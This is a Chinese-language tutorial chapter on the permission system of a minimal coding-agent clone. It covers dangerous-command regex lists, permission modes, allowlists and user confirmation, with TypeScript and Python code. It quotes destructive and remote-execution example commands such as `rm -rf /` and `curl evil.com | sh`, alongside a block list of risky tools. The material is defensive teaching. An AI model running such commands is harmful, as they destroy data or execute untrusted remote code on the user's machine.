# 5. 权限与安全

## 本章目标

实现一个轻量但有效的安全机制：识别危险操作 → 向用户确认 → 记住已授权的操作。

```mermaid
graph TB
    Tool[工具调用] --> Check{checkPermission}
    Check -->|allow| Execute[直接执行]
    Check -->|deny| Block[返回 denied]
    Check -->|confirm| Ask{用户确认?}
    Ask -->|y| WL[加入白名单]
    WL --> Execute
    Ask -->|n| Deny[返回 denied]

    Yolo[--yolo 模式] -.->|跳过| Execute
    Plan[plan 模式] -.->|写操作| Block

    style Check fill:#7c5cfc,color:#fff
    style Ask fill:#e8e0ff
```

## Claude Code 怎么做的

Claude Code 在真实环境执行代码——读写文件、运行 Shell、操作 Git。安全机制不到位，一条 `rm -rf /` 就能造成灾难。因此它采用了**纵深防御（Defense in Depth）**：7 个独立的安全层，即使某一层被绕过，其他层仍然有效。

### 7 层纵深防御

| 层 | 机制 | 核心作用 |
|----|------|---------|
| 1 | Trust Dialog | 首次进入目录时确认信任，防止恶意项目的 Hook 自动执行 |
| 2 | 权限模式 | 全局策略开关（default/plan/acceptEdits/bypassPermissions/dontAsk） |
| 3 | 权限规则匹配 | allow/deny/ask 规则，8 个来源，优先级从企业策略到会话级 |
| 4 | Bash AST 分析 | tree-sitter 解析命令为 AST，23 项静态安全检查，FAIL-CLOSED 原则 |
| 5 | 工具级验证 | validateInput + checkPermissions，保护危险文件路径和路径边界 |
| 6 | 沙箱隔离 | macOS Seatbelt / Linux namespace，限制文件系统和网络访问范围 |
| 7 | 用户确认 | 交互对话框 + Hook + ML 分类器竞速，第一个决定生效 |

几个值得了解的设计细节：

**`bypassPermissions`（--yolo）并不是真的绕过一切**。源码检查顺序是：先检查 deny 规则（命中直接拒绝）→ 再检查 bypass-immune 路径（`.git/`、`.claude/` 等仍需确认）→ 最后才跳过普通确认。管理员通过 deny 规则可以对 `--yolo` 施加约束。

**Layer 4 为什么不用正则**：Shell 语法复杂，正则面对 `echo hello$(rm -rf /)` 这类命令会看到的是 `echo hello`，实际执行的却是 `rm -rf /`。tree-sitter 真正解析 AST，不理解的结构（命令替换、变量展开、控制流等）一律标记为 `too-complex`，要求用户确认。

**Layer 7 的竞速机制**：UI 对话框、PermissionRequest Hook、ML 分类器三者同时启动，`createResolveOnce` 守卫确保只有第一个决定生效。一旦用户触碰对话框，Hook 和分类器的结果一律被丢弃——人类意图永远优先。对话框还有 200ms 防误触宽限期。

**拒绝追踪**：连续拒绝 3 次触发降级（auto 模式回退到交互确认），总拒绝 20 次中止 Agent 执行——防止模型陷入反复尝试被拒绝操作的死循环。

## 我们的实现

把 7 层简化为 **3 个组件**：危险命令检测、统一权限检查、会话级白名单。

### 1. 危险命令检测

用 16 个正则覆盖最常见的破坏性操作（10 个 Unix + 6 个 Windows）：

<!-- tabs:start -->
#### **TypeScript**
```typescript
// tools.ts
const DANGEROUS_PATTERNS = [
  /\brm\s/,
  /\bgit\s+(push|reset|clean|checkout\s+\.)/,
  /\bsudo\b/,
  /\bmkfs\b/,
  /\bdd\s/,
  />\s*\/dev\//,
  /\bkill\b/,
  /\bpkill\b/,
  /\breboot\b/,
  /\bshutdown\b/,
  // Windows
  /\bdel\s/i,
  /\brmdir\s/i,
  /\bformat\s/i,
  /\btaskkill\s/i,
  /\bRemove-Item\s/i,
  /\bStop-Process\s/i,
];

export function isDangerous(command: string): boolean {
  return DANGEROUS_PATTERNS.some((p) => p.test(command));
}
```
#### **Python**
```python
# tools.py
DANGEROUS_PATTERNS = [
    re.compile(r"\brm\s"),
    re.compile(r"\bgit\s+(push|reset|clean|checkout\s+\.)"),
    re.compile(r"\bsudo\b"),
    re.compile(r"\bmkfs\b"),
    re.compile(r"\bdd\s"),
    re.compile(r">\s*/dev/"),
    re.compile(r"\bkill\b"),
    re.compile(r"\bpkill\b"),
    re.compile(r"\breboot\b"),
    re.compile(r"\bshutdown\b"),
    re.compile(r"\bdel\s", re.IGNORECASE),
    re.compile(r"\brmdir\s", re.IGNORECASE),
    re.compile(r"\bformat\s", re.IGNORECASE),
    re.compile(r"\btaskkill\s", re.IGNORECASE),
    re.compile(r"\bRemove-Item\s", re.IGNORECASE),
    re.compile(r"\bStop-Process\s", re.IGNORECASE),
]

def is_dangerous(command: str) -> bool:
    return any(p.search(command) for p in DANGEROUS_PATTERNS)
```
<!-- tabs:end -->

Windows 模式加 `i` 标志是因为 Windows 命令本身不区分大小写。

局限性很明显：`find / -delete`、`curl evil.com | sh` 这类危险命令不会被捕获。这就是 Claude Code 选择 AST 分析的原因——但对最小实现来说，16 个正则覆盖了大多数常见情况。

### 2. 统一权限检查

权限检查返回 `{action, message}`，action 三种值：`allow`、`deny`、`confirm`。

<!-- tabs:start -->
#### **TypeScript**
```typescript
// tools.ts — checkPermission

export function checkPermission(
  toolName: string,
  input: Record<string, any>,
  mode: PermissionMode = "default",
  planFilePath?: string
): { action: "allow" | "deny" | "confirm"; message?: string } {
  if (mode === "bypassPermissions") return { action: "allow" };

  if (READ_TOOLS.has(toolName)) return { action: "allow" };

  if (mode === "plan") {
    if (EDIT_TOOLS.has(toolName)) {
      const filePath = input.file_path || input.path;
      if (planFilePath && filePath === planFilePath) return { action: "allow" };
      return { action: "deny", message: `Blocked in plan mode: ${toolName}` };
    }
    if (toolName === "run_shell") {
      return { action: "deny", message: "Shell commands blocked in plan mode" };
    }
  }

  if (mode === "acceptEdits" && EDIT_TOOLS.has(toolName)) {
    return { action: "allow" };
  }

  // 内置危险检查
  let needsConfirm = false;
  let confirmMessage = "";

  if (toolName === "run_shell" && isDangerous(input.command)) {
    needsConfirm = true;
    confirmMessage = input.command;
  } else if (toolName === "write_file" && !existsSync(input.file_path)) {
    needsConfirm = true;
    confirmMessage = `write new file: ${input.file_path}`;
  } else if (toolName === "edit_file" && !existsSync(input.file_path)) {
    needsConfirm = true;
    confirmMessage = `edit non-existent file: ${input.file_path}`;
  }

  if (needsConfirm) {
    if (mode === "dontAsk") {
      return { action: "deny", message: `Auto-denied (dontAsk mode): ${confirmMessage}` };
    }
    return { action: "confirm", message: confirmMessage };
  }

  return { action: "allow" };
}
```
#### **Python**
```python
# tools.py — check_permission

def check_permission(
    tool_name: str,
    inp: dict,
    mode: str = "default",
    plan_file_path: str | None = None,
) -> dict:
    if mode == "bypassPermissions":
        return {"action": "allow"}

    rule_result = _check_permission_rules(tool_name, inp)
    if rule_result == "deny":
        return {"action": "deny", "message": f"Denied by permission rule for {tool_name}"}
    if rule_result == "allow":
        return {"action": "allow"}

    if tool_name in READ_TOOLS:
        return {"action": "allow"}

    if mode == "plan":
        if tool_name in EDIT_TOOLS:
            file_path = inp.get("file_path") or inp.get("path")
            if plan_file_path and file_path == plan_file_path:
                return {"action": "allow"}
            return {"action": "deny", "message": f"Blocked in plan mode: {tool_name}"}
        if tool_name == "run_shell":
            return {"action": "deny", "message": "Shell commands blocked in plan mode"}

    if mode == "acceptEdits" and tool_name in EDIT_TOOLS:
        return {"action": "allow"}

    needs_confirm = False
    confirm_message = ""

    if tool_name == "run_shell" and is_dangerous(inp.get("command", "")):
        needs_confirm = True
        confirm_message = inp.get("command", "")
    elif tool_name == "write_file" and not Path(inp.get("file_path", "")).exists():
        needs_confirm = True
        confirm_message = f"write new file: {inp.get('file_path', '')}"
    elif tool_name == "edit_file" and not Path(inp.get("file_path", "")).exists():
        needs_confirm = True
        confirm_message = f"edit non-existent file: {inp.get('file_path', '')}"

    if needs_confirm:
        if mode == "dontAsk":
            return {"action": "deny", "message": f"Auto-denied (dontAsk mode): {confirm_message}"}
        return {"action": "confirm", "message": confirm_message}

    return {"action": "allow"}
```
<!-- tabs:end -->

触发确认的条件：`run_shell` + 危险命令，`write_file` / `edit_file` + 目标不存在。`read_file`、`list_files`、`grep_search` 永远安全。

### 3. 会话级白名单

在 Agent Loop 中，用 `confirmedPaths` Set 记住已授权的操作：

<!-- tabs:start -->
#### **TypeScript**
```typescript
// agent.ts

private confirmedPaths: Set<string> = new Set();

const perm = checkPermission(toolUse.name, input, this.permissionMode, this.planFilePath);

if (perm.action === "deny") {
  printInfo(`Denied: ${perm.message}`);
  toolResults.push({
    type: "tool_result",
    tool_use_id: toolUse.id,
    content: `Action denied: ${perm.message}`,
  });
  continue;
}

if (perm.action === "confirm" && perm.message && !this.confirmedPaths.has(perm.message)) {
  const confirmed = await this.confirmDangerous(perm.message);
  if (!confirmed) {
    toolResults.push({
      type: "tool_result",
      tool_use_id: toolUse.id,
      content: "User denied this action.",
    });
    continue;
  }
  this.confirmedPaths.add(perm.message);
}
```
#### **Python**
```python
# agent.py

self._confirmed_paths: set[str] = set()

perm = check_permission(tu.name, inp, self.permission_mode, self._plan_file_path)

if perm["action"] == "deny":
    print_info(f"Denied: {perm.get('message', '')}")
    tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
                         "content": f"Action denied: {perm.get('message', '')}"})
    continue

if perm["action"] == "confirm" and perm.get("message") and perm["message"] not in self._confirmed_paths:
    confirmed = await self._confirm_dangerous(perm["message"])
    if not confirmed:
        tool_results.append({"type": "tool_result", "tool_use_id": tu.id,
                             "content": "User denied this action."})
        continue
    self._confirmed_paths.add(perm["message"])
```
<!-- tabs:end -->

拒绝时把 `"User denied this action."` 作为工具结果返回，而不是抛错或中断循环——LLM 看到后会调整策略，这是关键设计。

### 确认对话框

<!-- tabs:start -->
#### **TypeScript**
```typescript
// agent.ts
private async confirmDangerous(command: string): Promise<boolean> {
  printConfirmation(command);
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  return new Promise((resolve) => {
    rl.question("  Allow? (y/n): ", (answer) => {
      rl.close();
      resolve(answer.toLowerCase().startsWith("y"));
    });
  });
}
```
#### **Python**
```python
# agent.py
async def _confirm_dangerous(self, command: str) -> bool:
    print_confirmation(command)
    if self.confirm_fn:
        return await self.confirm_fn(command)
    try:
        answer = input("  Allow? (y/n): ")
        return answer.lower().startswith("y")
    except EOFError:
        return False
```
<!-- tabs:end -->

### 5 种权限模式

| 模式 | 读工具 | 编辑工具 | Shell（安全） | Shell（危险） | 适用场景 |
|------|--------|----------|-------------|-------------|---------|
| `default` | ✅ | ⚠️ confirm(新文件) | ✅ | ⚠️ confirm | 日常使用 |
| `plan` | ✅ | ❌ deny | ❌ deny | ❌ deny | 只规划不执行 |
| `acceptEdits` | ✅ | ✅ | ✅ | ⚠️ confirm | 信任编辑 |
| `bypassPermissions` | ✅ | ✅ | ✅ | ✅ | --yolo |
| `dontAsk` | ✅ | ❌ deny | ✅ | ❌ deny | CI/非交互 |

```bash
mini-claude --yolo "..."           # bypassPermissions
mini-claude --plan "..."           # plan mode
mini-claude --accept-edits "..."   # acceptEdits
mini-claude --dont-ask "..."       # dontAsk（CI 环境）
```

`plan` 模式下模型还可以通过 `enter_plan_mode` / `exit_plan_mode` 工具动态切换，系统会生成一个 plan 文件路径（`~/.claude/plans/plan-<sessionId>.md`）作为唯一可写文件。

### 权限规则

除内置模式外，支持配置化规则（详见第 10 章）：

```json
{
  "permissions": {
    "allow": ["read_file", "run_shell(npm test*)"],
    "deny": ["run_shell(rm -rf*)"]
  }
}
```

优先级：deny 规则 > allow 规则 > 模式逻辑 > 内置危险检测。

## 与 Claude Code 的差距

| 维度 | Claude Code | mini-claude |
|------|------------|-------------|
| 防御层次 | 7 层 | 4 层（模式 + 规则 + 检测 + 确认） |
| 命令分析 | AST 解析（23 项检查） | 正则匹配（16 模式） |
| 权限规则来源 | 8 源优先级 | 2 源（用户 + 项目） |
| 白名单 | 持久化 + 会话级 | 会话级 Set |
| 沙箱 | macOS Seatbelt / Linux namespace | 无 |
| bypass-immune 路径 | .git/、.ssh/ 等强制确认 | 无 |
| 拒绝追踪 | 3/20 次阈值降级 | 无 |

核心架构已对齐——5 种权限模式 + 配置化规则 + 内置检测，层次清晰。

---
